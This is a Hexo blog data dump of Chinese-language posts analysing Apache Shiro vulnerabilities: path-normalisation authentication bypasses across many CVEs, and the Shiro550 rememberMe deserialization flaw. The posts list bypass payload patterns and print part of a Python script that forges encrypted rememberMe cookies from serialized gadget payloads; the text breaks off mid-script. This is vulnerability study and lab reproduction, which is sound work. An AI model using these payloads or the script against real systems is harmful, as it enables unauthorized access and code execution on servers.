{"meta":{"title":"n1utra's blog","subtitle":"","description":"网络安全","author":"n1utra","url":"http://example.com","root":"/"},"pages":[{"title":"所有标签","date":"2025-06-21T19:53:20.497Z","updated":"2025-06-21T19:53:20.497Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"参考连接","date":"2025-09-14T13:59:34.974Z","updated":"2025-09-14T13:59:34.974Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":"这里是在学习过程中参考学习的一些师傅的链接： 白日梦组长的个人空间-白日梦组长个人主页-哔哩哔哩视频 drun1baby.top Firebasky&#x2F;Java: 关于学习java安全的一些知识,正在学习中ing,欢迎fork and star Y4tacker&#x2F;JavaSec: a rep for documenting my study, may be from 0 to 0.1 Shiro漏洞分析 [前言 · 攻击Java Web应用-Java Web安全]"},{"title":"","date":"2025-07-06T15:25:15.315Z","updated":"2025-07-06T15:25:15.315Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"一个用来记录自己学习过程的博客。"},{"title":"所有分类","date":"2025-06-21T19:52:31.922Z","updated":"2025-06-21T19:52:31.922Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Shiro历史漏洞分析(3)：权限绕过","slug":"Shiro历史漏洞分析-3-：权限绕过","date":"2025-09-14T13:57:10.000Z","updated":"2025-10-16T15:33:21.947Z","comments":true,"path":"2025/09/14/Shiro历史漏洞分析-3-：权限绕过/","permalink":"http://example.com/2025/09/14/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3-%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/","excerpt":"","text":"Shiro的路径匹配在前面的代码中，实现了一个简单的shiro的拦截。这里来说一下shiro的路径匹配。 shiro与fastjson不同，fastjson是通过方法去主动调用，而shiro更像是一个被动的过程，配置好之后接收请求即可。 Shiro的本质是一个Filter，通过Servlet Filter获取请求。当配置好ShiroFilterFactoryBean之后，最终会生成一个AbstractShiroFilter，这个类继承自OncePerRequestFilter，而后者实现了Filter 当用户发送请求之后，tomcat接收到请求，根据配置查找匹配的Filter和servlet。然后会通过一个代理Filter：DelegatingFilterProxy将Servlet容器中的Filter生命周期委托给Spring管理的bean，这里就是Shiro中ShiroFilterFactoryBean创建的Filter。 在DelegatingFilterProxy会调用到delegate.doFilter()，这里的delegate就是ShiroFilterFactoryBean创建的filter，这个filter真实类型为：AbstractShiroFilter。 当AbstractShiroFilter#doFilterInternal获取到请求之后，会获得原始的请求、响应、以及shiro的过滤链 然后会执行executeChain方法，executeChain会执行到getExecutionChain方法，这个方法执行到resolver.getChain(request, response, origChain);，进入这个方法，这是一个接口，找到这个方法的实现，在这个实现中对请求的路径与shiro配置中的路径进行了匹配 匹配结束后会根据设置将请求交给中间件处理，shiro不会对URI进行处理，本质上还是中间件在对路径进行处理然后转发等操作。 shiro的权限绕过简单来说是通过改变URI达到能够匹配到/**的权限配置，这种一般不进行鉴权，从而绕过鉴权 CVE-2010-3863漏洞信息漏洞版本：shiro &lt; 1.1.0 和JSecurity 0.9.x 漏洞环境：https://github.com/dota-st/vulnEnv 漏洞描述：这里是shiro在路径匹配时没有对请求的uri进行标准化导致绕过。 漏洞复现在IDEA中直接运行，访问8088端口即可访问到页面 直接访问管理员页面会返回重定向 通过/./进行绕过 代码分析先看看ShiroConfig.java中对权限的分配，可以看到，这里除了admin.html和user.html需要鉴权，其他的都不需要鉴权。 那么现在来分析下漏洞是如何产生的 在前面提到的getChain打上断点，这里是进行路径匹配的地方 这里通过getPathWithinApplication获取到请求的URI，即/./admin.html，深入查看下这个方法是如何获取的 getPathWithinApplication其实是调用了WebUtils.getPathWithinApplication方法，在这个方法中对请求进行处理，然后获取到URI。 在方法中首先获取当前Web应用的上下文路径，然后获取到请求的URI，然后判断是否是以上下文路径开头，如果是就截取后续路径，否则直接返回原始URI。这里就是在获取真实路径，比如一个系统每个接口都是/app开头，那么这里的/app就是上下文路径，/app后面的才是真实路径。 可以看到这里直接获取到请求路径，并没有进行过滤等处理。 返回getChain方法中，在for循环中，会遍历ShiroConfig.java中定义的路径，当前路径为/./admin.html，是不能匹配到/admin.html和/user.html的，所以就不会进入对应的权限校验，最后就进入了/**的逻辑，这里就是匹配所有，并且配置中设置为匿名访问，即不需要鉴权，所以后续就直接进行了放行处理。而/./admin.html和/amdin.html其实是同一个文件，所以能够执行到这个文件。 CVE-2014-0074漏洞版本：Shiro &lt; 1.2.3 这个环境搭建有点麻烦，建议直接看su18师傅的复现文章从 CVE 学 Shiro 安全-1 | 素十八 这里其实是shiro和ldap的配置冲突问题造成的，在LDAP服务器允许匿名绑定的情况下提交空账户或空密码就能够绕过身份验证 CVE-2016-6802漏洞信息漏洞版本：Shiro &lt; 1.3.2 漏洞环境：ShiroVuln&#x2F;CVE-2016-6802 at main · n1utra&#x2F;ShiroVuln 漏洞简述：本漏洞类似 CVE-2010-3863，依旧是路径标准化导致的问题，不过之前是在 Request URI 上，本漏洞是在 Context Path 上。 其实就是构造一个虚拟路径结合路径穿越，绕过shiro匹配时对于路径上下文的处理，然后就绕过了shiro的配置。 漏洞复现直接访问路径是302 使用payload访问则能成功访问 代码分析这里要求系统必须存在一个上下文路径，我这里设置的是/app 在前面我们知道，在PathMatchingFilterChainResolver#getChain方法中，通过getPathWithinApplication(request)方法获取到请求的URI，这里又会先获得上下文路径然后去除这个路径，从而获取获得真实的路径。问题就出在这里的上下文，payload中的路径通过getContextPath返回的是/test/../app，这就导致在去除上下文路径是无法满足if为true即StringUtils.startsWithIgnoreCase，那么就会直接返回requestUri 而这里的requestUri为什么又没有/test/..这个路径了呢？看看getRequestUri的代码部分，这个方法最终会调用一个normalize方法，在这个方法中，通过处理路径中的//、/./、/../来实现目录回退，最终获得请求的URI 此时contextPath与requestUri无法匹配，则直接返回URI，然后就进入了shiro的路径循环中，但是shiro.ini中配置的路径是真实路径，即/admin/*，而当前的请求路径是/app/admin/profile，自然无法满足判断，所以继续循环，直到匹配到/**满足判断，然后返回相应的内容，完成权限绕过 这里本质上是在绕过shiro对于请求路径的上下文处理，从而使URI能够绕过需要鉴权的部分，匹配到/**，也就是说不局限于payload中的绕过，还可以使用/./app/admin/profle、/;/app/admin/profile，需要注意的是/;/的原理与/./不同，/;/这里是在getRequestUri方法中调用了decodeAndCleanUriString方法，在这个方法中对URI进行了处理，获取;前面的路径 补充：为什么getContextPath获取到的是&#x2F;test&#x2F;..&#x2F;app 参考：https://www.javasec.org/java-vuls/shiro/Shiro-2.html#contextpath CVE-2020-1957漏洞信息影响版本：shiro &lt; 1.5.2 漏洞环境：[VulWiki&#x2F;Web安全&#x2F;Apache Shiro&#x2F;（CVE-2020-1957）Apache Shiro &lt; 1.5.2 身份认证绕过漏洞.md at 262bbf7e127939cbcdd6bf176678be520d948334 · Ares-X&#x2F;VulWiki](https://github.com/Ares-X/VulWiki/blob/262bbf7e127939cbcdd6bf176678be520d948334/Web安全/Apache Shiro&#x2F;（CVE-2020-1957）Apache Shiro &lt; 1.5.2 身份认证绕过漏洞.md?plain&#x3D;1#L2) 漏洞描述：利用 Shiro 和 SpringBoot 对 URL 的处理的差异化，可以绕过 Shiro 对 SpringBoot 中的 Servlet 的权限控制，越权并实现未授权访问。 漏洞复现该漏洞存在多个payload 直接访问时会返回重定向 payload：1 在路径后面添加/进行绕过 payload：2 在前面添加/xx/..;绕过 payload：3 在前面添加/;/进行绕过 除此之外还存在其他的各种变种payload，这里不做过多说明 代码分析先来说说payload:1 /绕过这里是因为Shiro和SpringBoot对于路径处理的差异导致的，Shiro中/admin/1/和/admin/1是不同的。而在Spring中二者都会被处理为/admin/1 如果shiro中对于/admin下面的接口配置的规则为/admin/*，表示只会匹配/admin后面一级的路径。此时我们访问/admin/1/，在匹配时，是不会匹配到鉴权的，那么就会继续循环，最后默认放行。 放行之后进入到Spring进行处理，而Spring对路径进行了规范化处理 在Spring中具体是在PatternsRequestCondition#getMatchingPattern中进行匹配，这里存在4个if，代表着4中匹配模式，首先是完全匹配，请求路径和模式也就是路由完全相等。第二个是后缀名匹配，会尝试匹配带有文件扩展名的模式。第三种是使用AntPathMatcher进行匹配。第四种则是在模式后面添加/再与请求URI进行AntPathMatcher匹配，就是在这里进行了处理 最后通过第四种方式完成了匹配，进而返回pattern，然后一直向后运行返回数据 /xx/..;和/;/绕过这两种绕过本质上都是一种，是Shiro自身处理时只获取了;之前的路径，然后绕过了Shiro的验证，再与Spring对路径的处理机制结合造成了绕过。 还是在getRequestUri方法获取请求URI时，调用了decodeAndCleanUriString方法进行处理 后续匹配时就无法与权限校验设置的路径进行匹配 但是这里放行的是/xx/..;/admin/1，Spring是如何处理的呢？ 在Spring执行过程中会运行到UrlPathHelper#getPathWithinServletMapping这个方法，根据方法名就能知道这里是获取Servlet的路径，其中的参数是传入的请求 这里方法getPathWithinApplication(request);方法获取请求路径时时除了路径中的; 这里面调用了getRequestUri-&gt;decodeAndCleanUriString-&gt;removeSemicolonContent-&gt;removeSemicolonContentInternal，并且在这个过程中还进行了URL解码以及清除路径中连续的/ 获取请求中的URI路径之后，回到getPathWithinServletMapping方法，然后根据请求从Servlet中获取路由，来看看这里是如何根据请求获取路由的，在getServletPath方法中又是通过request.getServletPath获取，继续跟进 后面就涉及到servlet容器对请求路径的解析和Spring框架的路径处理机制。/xx/..;/admin/1会被分为应用上下文路径：/xx/..;、Servlet路径：/admin/1和PathInfo：可能为空或者其他值。 当Servlet容器处理这个URL时： 路径遍历处理：&#x2F;xx&#x2F;.. 被解析为回到上级目录 路径参数处理：; 后面的部分被视为路径参数 最终路径：剩余的有效路径 &#x2F;admin&#x2F;1 被识别为Servlet路径 获取到Servlet路径之后，返回到getPathWithinServletMapping方法中，可以看到后面还进行了多个if判断，但是这里都不满足，就直接返回了获取到的servletPath，就相当于直接返回了/admin/1这个路由。 CVE-2020-11989漏洞信息影响版本：Shiro &lt; 1.5.3 漏洞环境：ShiroVuln&#x2F;CVE-2020-11989 at main · n1utra&#x2F;ShiroVuln 漏洞描述：在 Apache Shiro 1.5.3 之前的版本，将 Apache Shiro 与 Spring 动态控制器一起使用时，特制请求可能会导致身份验证绕过。 漏洞复现这个漏洞存在两种绕过，直接访问是302 &#x2F;；&#x2F;绕过 这个需要存在上下文路径 二次编码绕过 这个其实有点鸡肋，感觉没什么可利用点。需要shiro使用的ant风格是*而不是**，或者?也可以。 代码分析/;/绕过前面已经说过，这里就不在赘述。说一下二次编码绕过 先来看看payload是什么，/app/admin/a%25%32%66a经过解码是/app/admin/a%2fa，再解码一次就是/app/admin/a/a 那么现在看看再Shiro中获取到的URI是什么样子。 还是在PathMatchingFilterChainResolver#getChain方法打上断点，这里可以看到通过getPathWithinApplication方法获取到的URI就是经过二次编码后的/app/admin/a/a 在getPathWithinApplication方法中调用了getRequestUri方法，这个方法中通过getContextPath获得上下文路径，然后在getServletPath方法中经过了一次URL解码，最后又在decodeAndCleanUriString中进行了一次解码 最后再去除上下文，那么在Shiro中进行匹配的路径就是/admin/a/a，由于这里ant仅仅设置了/admin/*，仅匹配后续一级路径，无法匹配到这里/a/a这个两级路径，所以就会放行。 那么Shiro放行的原因看完了，接下来看看SpringBoot是如何执行的。 在UrlPathHelper#getPathWithinServletMapping方法打上断点，这里首先是通过getPathWithinApplication去掉上下文路径获取真实路径，然后通过getServletPath获取对应的路由，然后通过getSanitizedPath方法进行规范。然后判断路由路径是否包含规范后的请求路径，如果匹配就返回getRemainingPath处理后的path 在getPathWithinApplication方法中可以看到Spring中还是通过getRequestUri方法来获取请求中的URI，没有进行过多的处理 那么这里返回的就是/admin/a%2fa，可以看到这里后面就变成了字符串，满足了/admin/&#123;name&#125;也就是在路由中的配置。从而绕过了Shiro的鉴权。 CVE-2020-13933漏洞信息影响版本：Shiro &lt; 1.6.0 漏洞环境： 漏洞描述：这其实是CVE-2020-11989的一种bypass，利用也很鸡肋。这里是因为Shiro和Spring对于路径的处理顺序不同 漏洞复现直接访问提示302 通过%3b进行绕过 代码分析还是先来看看Shiro是怎么处理这个路径的，还是看getPathWithinApplication这个方法，可以看到Shiro在在1.5.3版本中，是通过getServletPath和getPathInfo拼接来获取的，获取值的时候就已经进行了URL解码。然后对拼接的结果通过removeSemicolon方法进行了处理。 那么removeSemicolon进行了什么操作呢？其实就是去除了;后面的路径，只保留前面的路径 所以Shiro这里只获取到了/admin/这个路径，但是这里是无法与/admin/*进行匹配的，所以Shiro这里是直接放行了 接下来还是看看Spring的操作 在Spring的getPathWithinServletMapping中调用的getPathWithinApplication来处理URI，主要是getRequestUri这里在进行处理 进入getRequestUri方法可以看到在获取到URI之后，最后是通过decodeAndCleanUriString这个方法进行处理。 进入decodeAndCleanUriString这个方法，这里对URI处理如下：去除分号后面的内容、URL转码、清除多余/。可以看到这里和Shiro的处理顺序是不同的 ，这里是先去除分号再进行URL转码。所以出现了问题，Payload经过了URL编码，在去除的时候无法识别，然后再经过URL转码回来就被当作了URI的一部分。造成了问题。 CVE-2020-17510漏洞信息影响版本：Shiro &lt; 1.7.0 漏洞环境：ShiroVuln&#x2F;CVE-2020-17510 at main · n1utra&#x2F;ShiroVuln 漏洞描述：这个漏洞本质还是对于ant匹配的绕过，之前利用过了;的URL编码，现在则是利用.的URL编码。同样也是一种bypass，但是更鸡肋。 漏洞复现直接访问是302跳转 通过/%2e进行则能绕过 代码分析这里需要SpringBoot大于2.3.0才能复现 还是先看Shiro对路径的处理 这里Shiro的处理和前面一样，最终是通过getServletPath(request) + getPathInfo(request)获取到URI，这里获取到的URI就是经过处理之后的/admin/，并且无法匹配到/admin/*，那么就会进行放行。 接下来还是看看Spring的处理，可以在看到，Spring最终拿到的uri还是/admin/. CVE-2020-17523漏洞信息影响版本：Shiro &lt; 1.7.1 漏洞环境：ShiroVuln&#x2F;CVE-2020-17523 at main · n1utra&#x2F;ShiroVuln 漏洞描述：是CVE-2020-17510修复之后的bypass，使用空格%20绕过。 漏洞复现 漏洞描述原理和上面一样，这就不再多说了 CVE-2021-41303漏洞信息影响版本：Shiro = 1.7.1 漏洞环境：ShiroVuln&#x2F;CVE-2021-41303 at main · n1utra&#x2F;ShiroVuln 参考链接：[从源码diff分析Apache-Shiro 1.7.1版本的auth bypass（CVE-2021-41303）） | 大彩笔threedr3am](https://threedr3am.github.io/2021/09/22/从源码diff分析Apache-Shiro 1.7.1版本的auth bypass（CVE-2021-41303）&#x2F;) 漏洞描述：这个需要一定的条件，利用起来比较困难，需要ShiroConfig的配置按照以下顺序 12map.put(&quot;/admin/*/index&quot;, &quot;authc&quot;);map.put(&quot;/admin/demo/index&quot;, &quot;anon&quot;); 漏洞复现直接访问路径返回302 添加/进行绕过 代码分析Shiro在1.7.1版本中，getChain方法中增加了一个判断，在对URI与鉴权配置的路径匹配之后，如果匹配不上就会对两者最后面的/去掉(如果有的话)然后再进行匹配。 问题就出在第二个判断中，当满足第二个判断之后，return中返回的是用户传入的URI,而并非Shiro中遍历出来的值。就是这里造成了问题。 现在通过断点调试来理解这句话。 先注意下我们的ShiroConfig中的配置，这里说一下，Shiro鉴权配置可以理解为从上到下依次匹配 12/admin/*/index # 这个路径鉴权/admin/demo/index # 这个路径不鉴权 当我们使用/admin/demo/index发起请求之后，在getChain中先和/admin/*/index进行匹配，这里满足了代码中的第一个if，这里就会进入鉴权的逻辑。 但是使用/admin/demo/index/发起请求之后，同样是先匹配到/admin/*/index，但是不满足第一个if，就会进入第二个if，通过对路径去掉/再进行匹配，这里也能匹配到，但是返回的是requestURINoTrailingSlash而不是Shiro中当前循环的pathPattern，那么就会进入当前requestURINoTrailingSlash即/admin/demo/index所代表的逻辑，也就是不需要鉴权的逻辑。 CVE-2022-32532漏洞信息影响版本：Shiro &lt; 1.9.1 漏洞环境： 漏洞描述：在1.9.1之前的Apache Shiro中，RegexRequestMatcher可能会被错误配置，从而在某些servlet容器上被绕过。应用程序使用RegExPatternMatcher与.的正则表达式可能容易被授权绕过。其实就是如果系统通过自定义的正则去匹配路径时，会因为java的正则默认情况下.不能匹配到\\r和\\n造成的。 漏洞复现这里使用的是4ra1n师傅搭建的环境 直接访问接口会提示access denied 结合payload则成功访问 代码分析还是在getChain下断点，可以看到现在Shiro中的pathPattern已经变成了之前设置好的正则 查看下pathMatches方法，这里调用了matches方法 跟进matches方法，这里其实就是在进行正则匹配，可以看到这里采用了完全匹配，但是java的正则中.默认无法匹配到\\r和\\n，所以这里完全匹配就失败了，一路返回false 回到getChain，这里匹配/permit.*就匹配不上了，所以会默认通行。 那么来看看Spring是如何处理这个URL的 进入lookupHandlerMethod方法，这里是直接匹配处理器方法的地方，也就是根据URI匹配controller的地方 首先是List&lt;T&gt; directPathMatches = this.mappingRegistry.getMappingsByDirectPath(lookupPath);直接进行精确路径匹配，获得与当前路径完全一致的映射项目，这里显然是没有的，运行结果为null 那么就会进入if (matches.isEmpty())这个判断，执行addMatchingMappings方法，这里进行的是详细条件匹配，最终调用的是getMatchingCondition方法，通过对请求中的参数、请求头等等信息进行匹配来获得对应的执行器，当前匹配的对象是/permit/&#123;value&#125;，是能够满足所有的条件的，那么最后就能够走到对应的路由 当然这里其实也匹配了URI，具体是在如下的代码处 其中getMatchingCondition方法中先获取了请求中去除上下文之后的路径 然后通过getMatchingPatterns方法进行了匹配，而这个方法通过pattern.matches去匹配遍历出来的已注册的路径。这里面又涉及到多种模式匹配，不再过多描述。 CVE-2022-40664漏洞信息影响版本：Shiro &lt; 1.10.0 漏洞环境：ShiroVuln&#x2F;CVE-2022-40664 at main · n1utra&#x2F;ShiroVuln 漏洞描述：当应用通过 RequestDispatcher 做 forward&#x2F;include 时，Shiro 的 RegexRequestMatcher 不会重新执行完整的鉴权检查，导致攻击者只需发送一个构造的合法 HTTP 请求即可越过过滤器链，直接访问受保护资源。其实也挺鸡肋的，需要代码本身存在一个接口，访问的时候会跳转到受保护的资源。 漏洞复现直接访问/admin会跳转到/login 访问/proxy则能够获取到/admin的内容 代码分析漏洞的原因出现在org.apache.shiro.web.servlet.OncePerRequestFilter#doFilter这个方法中 这里接收到请求之后，会从请求中获取alreadyFilteredAttributeName属性，但然后进入if判断，第一次请求时并不满足判断，最后走入了else分支，这里对这个属性设置为Boolean.TRUE 然后通过doFilterInternal放行进行forward:/admin转发，此时会再一次进入到doFilter方法中，此时就会进入if分支，从而直接放行绕过鉴权。 这里是看的网络上的分析文章，我搭建的代码环境折腾了很久都没有复现出这个步骤，只能暂且搁置。 CVE-2023-22602漏洞信息影响版本：Shiro &lt;=1.11.0与SpringBoot&gt; 2.6 漏洞环境：ShiroVuln&#x2F;CVE-2023-22602 at main · n1utra&#x2F;ShiroVuln 漏洞描述：Shiro在1.11.0版本之前只兼容Spring的ant-style路径匹配模式，但是2.6版本后的SpringBoot的路径匹配模式从AntPathMatcher更改为了PathPatternParser，当Shiro 1.11.0及之前的版本与Spring 2.6及之后的版本使用不同的路径匹配模式时，可以绕过Shiro的身份认证。 漏洞复现直接访问接口会进行302跳转 通过payload绕过则能进行访问 代码分析这里漏洞产生的原因是Shiro 1.10.0及之前版本与SpringBoot 2.6之后版本对于路径匹配模式不同导致的绕过，所以这里直接查看二者路径匹配的地方。 还是查看Shiro的getChain方法，可以看到方法中获取到的路径是/../后面的，也就是说getPathWithinApplication将其中的路径穿越执行之后的路径，而/111在ShiroConfig的配置是无需鉴权，所以在Shiro中直接放行了 前面看到Shiro中对于/admin/../111这个请求中匹配的是/111，然后直接放行，那么接下来看看SpringBoot是如何处理这个路径的。 还是在Spring的lookupHandlerMethod方法打断点，这里就和上面CVE-2022-32532类似，进行多种模式的匹配。 后记Shiro这部分写的很烂，写的时候感觉是为了写而写，并且其中还存在不少问题，尤其涉及到spring的部分，可能还会存在一些错误。我对于spring也不太熟悉，希望之后会有时间将这部分重构。","categories":[],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"Shiro","slug":"Shiro","permalink":"http://example.com/tags/Shiro/"}]},{"title":"Shiro历史漏洞分析(2)：反序列化漏洞","slug":"Shiro历史漏洞分析-2-：反序列化漏洞","date":"2025-08-10T14:52:41.000Z","updated":"2025-10-16T13:03:49.915Z","comments":true,"path":"2025/08/10/Shiro历史漏洞分析-2-：反序列化漏洞/","permalink":"http://example.com/2025/08/10/Shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2-%EF%BC%9A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"Shiro反序列化Shiro的反序列化其实就两个，Shiro550和Shiro721，其他基本都是权限绕过相关的漏洞。 环境搭建直接在github获取shiro 1.2.24的包，然后本地IDEA打开，然后修改shiro-shiro-root-1.2.4\\samples\\web\\pom.xml中jsp的解析依赖jstl，给这个依赖新增一个version，实现如下： 然后配置tomcat，需要先下载一个tomcat，然后编辑IDEA的运行&#x2F;调试配置，添加一个新的运行配置。添加时选择本地tomcat 然后修改下服务器配置，比如名称，然后配置应用程序服务器路径。 然后在部署页面，添加工件 这里选择/samples_web_war:war这个选项，然后上下文这里将多余字符删除，仅保留/ 应用之后直接运行tomcat，然后访问http://127.0.0.1:8080/，出现如下画面说明配置成功 原理分析shiro小于1.4.2版本默认使用AES-CBC-PKCS5Padding填充。 众所周知，在shiro登录时选择记住用户，会返回一个带有rememberMe的Cookie字段，后续访问就会携带这个字段。在这个测试站进行登录测试，发现返回的Cookie字段很长，一般来说Cookie中的字段都比较短，那么这里很长的话就代表里面保存了很多信息，一般保存这种信息的方式就是反序列化。 那我们看看这个Cookie是怎么处理的。 直接在IDEA搜索Cookie的字段。找到org.apache.shiro.web.mgt.CookieRememberMeManager这个类，看起来像是处理Cookie的东西。 然后在这个类中找到一个方法getRememberedSerializedIdentity看名字就是反序列化相关的操作。 12345678910111213141516171819202122232425262728293031323334353637383940protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123; if (!WebUtils.isHttp(subjectContext)) &#123; if (log.isDebugEnabled()) &#123; String msg = &quot;SubjectContext argument is not an HTTP-aware instance. This is required to obtain a &quot; + &quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot; + &quot;immediately and ignoring rememberMe operation.&quot;; log.debug(msg); &#125; return null; &#125; WebSubjectContext wsc = (WebSubjectContext) subjectContext; if (isIdentityRemoved(wsc)) &#123; return null; &#125; HttpServletRequest request = WebUtils.getHttpRequest(wsc); HttpServletResponse response = WebUtils.getHttpResponse(wsc); String base64 = getCookie().readValue(request, response); // Browsers do not always remove cookies immediately (SHIRO-183) // ignore cookies that are scheduled for removal if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null; if (base64 != null) &#123; base64 = ensurePadding(base64); if (log.isTraceEnabled()) &#123; log.trace(&quot;Acquired Base64 encoded identity [&quot; + base64 + &quot;]&quot;); &#125; byte[] decoded = Base64.decode(base64); if (log.isTraceEnabled()) &#123; log.trace(&quot;Base64 decoded byte array length: &quot; + (decoded != null ? decoded.length : 0) + &quot; bytes.&quot;); &#125; return decoded; &#125; else &#123; //no cookie set - new site visitor? return null; &#125;&#125; 阅读这个方法，首先从上下文中获取请求和响应对象，然后通过getCookie().readValue读取预定义的Cookie模板，即获得rememberMe的值。这里为什么是获取的rememberMe？在CookieRememberMeManager类构造方法中写死cookie名字是这个常量，而这个常量就是rememberMe，如果修改Shiro特征，就可以改变这个常量。 回到getRememberedSerializedIdentity方法，获取到指定值之后，如果这个值包含DELETED_COOKIE_VALUE这个常量，也就是deleteMe，就返回null 然后判断值是否为空，不为空则进行base64解码。那我们把这个字符串解码看看，解码后发现看不懂，那么应该是加密后的数据通过Base64编码进行传输。接下来寻找调用了getRememberedSerializedIdentity方法的地方 在org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals#getRememberedPrincipals这里发现调用。 1234567891011121314public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) &#123; PrincipalCollection principals = null; try &#123; byte[] bytes = getRememberedSerializedIdentity(subjectContext); //SHIRO-138 - only call convertBytesToPrincipals if bytes exist: if (bytes != null &amp;&amp; bytes.length &gt; 0) &#123; principals = convertBytesToPrincipals(bytes, subjectContext); &#125; &#125; catch (RuntimeException re) &#123; principals = onRememberedPrincipalFailure(re, subjectContext); &#125; return principals;&#125; 这里接收到值，然后经过convertBytesToPrincipals方法处理，那么进入这个方法看看 123456protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) &#123; if (getCipherService() != null) &#123; bytes = decrypt(bytes); &#125; return deserialize(bytes);&#125; 可以看到这个方法先进行了decrypt解密，然后通过deserialize进行反序列化。 先看看这里是怎么解密的。进入decrypt方法，这里接收一个字节数组，然后CipherService cipherService = getCipherService();这里获取密钥，再通过cipherService.decrypt解密。 123456789protected byte[] decrypt(byte[] encrypted) &#123; byte[] serialized = encrypted; CipherService cipherService = getCipherService(); if (cipherService != null) &#123; ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey()); serialized = byteSource.getBytes(); &#125; return serialized;&#125; 先来看看密钥，getCipherService是一个get方法，CipherService这个属性是在AbstractRememberMeManager#AbstractRememberMeManager初始化时赋值的 这个常量也是在AbstractRememberMeManager类中硬编码写死的。 并且在密钥上面的注释中已经写出了是AES的算法。然后再看看具体的实现部分，这里还传入了一个IV，这里的iv值是通过System.arraycopy(ciphertext, 0, iv, 0, ivByteSize)从数据开头提取16个字节的数据作为iv值 12345678910111213141516171819202122232425262728293031323334353637public ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException &#123; byte[] encrypted = ciphertext; //No IV, check if we need to read the IV from the stream: byte[] iv = null; if (isGenerateInitializationVectors(false)) &#123; try &#123; //We are generating IVs, so the ciphertext argument array is not actually 100% cipher text. Instead, it //is: // - the first N bytes is the initialization vector, where N equals the value of the // &#x27;initializationVectorSize&#x27; attribute. // - the remaining bytes in the method argument (arg.length - N) is the real cipher text. //So we need to chunk the method argument into its constituent parts to find the IV and then use //the IV to decrypt the real ciphertext: int ivSize = getInitializationVectorSize(); int ivByteSize = ivSize / BITS_PER_BYTE; //now we know how large the iv is, so extract the iv bytes: iv = new byte[ivByteSize]; System.arraycopy(ciphertext, 0, iv, 0, ivByteSize); //remaining data is the actual encrypted ciphertext. Isolate it: int encryptedSize = ciphertext.length - ivByteSize; encrypted = new byte[encryptedSize]; System.arraycopy(ciphertext, ivByteSize, encrypted, 0, encryptedSize); &#125; catch (Exception e) &#123; String msg = &quot;Unable to correctly extract the Initialization Vector or ciphertext.&quot;; throw new CryptoException(msg, e); &#125; &#125; return decrypt(encrypted, key, iv);&#125; 也就是说Shiro接收到Cookie之后，先通过Base64进行解码，然后通过AES解密，并且解密的Key为一个常量，解密之后调用deserialize进行反序列化。 现在看看这个deserialize方法，回到convertBytesToPrincipals这个方法中，进入deserialize方法 这里先通过getSerializer获得反序列化器，那么看看这里的Serializer是怎么赋值的。发现这里同样是在AbstractRememberMeManager构造方法中就进行了赋值 也就是说这里调用的是DefaultSerializer.deserialize，而这个方法其实就是原生的反序列化方法。如果这里存在CC链等依赖或其他可用依赖，就可以直接利用了。 巧合的是，Shiro包中自带CC3.2.1，但是这是test包中的，maven运行时只会把compile和runtime进行编译，也就是说实际上打CC是打不到的。 这里还可以选择使用JDK自带的URLDNS链进行测试。通过yakit生成一个URLDNS利用链的base64，然后用脚本生成一个shiro的cookie头 然后通过这个Cookie去访问，但是此时访问发现并没有触发dns，原因是当前Cookie中存在SESSIONID字段，就不会走到rememberMe这里 把sessionid字段删除之后再访问，成功触发DNS访问。 利用脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100import base64import osimport argparseimport sysfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modesfrom cryptography.hazmat.backends import default_backenddef pad(data): &quot;&quot;&quot;PKCS5 padding&quot;&quot;&quot; block_size = 16 padding = block_size - len(data) % block_size return data + bytes([padding] * padding)def unpad(data): &quot;&quot;&quot;Remove PKCS5 padding&quot;&quot;&quot; padding = data[-1] return data[:-padding]def shiro_encrypt(data, key_base64): &quot;&quot;&quot; Encrypt data using Shiro&#x27;s encryption method (AES/CBC/PKCS5Padding) :param data: Data to encrypt (bytes) :param key_base64: Base64 encoded key :return: Base64 encoded encrypted data &quot;&quot;&quot; # Decode the key from base64 key = base64.b64decode(key_base64) # Generate a random IV (16 bytes for AES) iv = os.urandom(16) # Pad the data padded_data = pad(data) # Create cipher and encrypt cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()) encryptor = cipher.encryptor() encrypted_data = encryptor.update(padded_data) + encryptor.finalize() # Prepend IV to the encrypted data result = iv + encrypted_data # Return base64 encoded result return base64.b64encode(result).decode(&#x27;utf-8&#x27;)def process_base64_file(file_path, key_base64): &quot;&quot;&quot; Process a file containing base64 encoded data and encrypt it with Shiro method :param file_path: Path to file containing base64 data :param key_base64: Base64 encoded key for encryption :return: Encrypted data as base64 string &quot;&quot;&quot; with open(file_path, &#x27;r&#x27;) as f: base64_data = f.read().strip() # Decode the base64 data data = base64.b64decode(base64_data) # Encrypt with Shiro method encrypted_data = shiro_encrypt(data, key_base64) return encrypted_datadef process_binary_file(file_path, key_base64): &quot;&quot;&quot; Process a binary file containing serialized data and encrypt it with Shiro method :param file_path: Path to binary file containing serialized data :param key_base64: Base64 encoded key for encryption :return: Encrypted data as base64 string &quot;&quot;&quot; with open(file_path, &#x27;rb&#x27;) as f: data = f.read() # Encrypt with Shiro method 